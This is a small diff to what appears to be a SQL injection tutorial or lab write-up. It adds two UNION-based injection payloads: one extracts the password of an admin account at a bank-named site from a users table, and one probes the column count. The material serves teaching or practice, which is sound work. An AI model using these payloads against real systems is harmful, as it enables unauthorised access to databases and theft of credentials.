@@ -95,3 +95,11 @@ query would look like:
 *NOTE*:
 
 AND 0 ignores first table result, throws false to first query/statement
+
+```
+‘ AND 0 Union SELECT 1, 2, 3, 4, password, date() FROM users WHERE email = "admin@viking.bank"--
+```
+
+```
+‘ UNION SELECT NULL, NULL, NULL, NULL, NULL—
+```
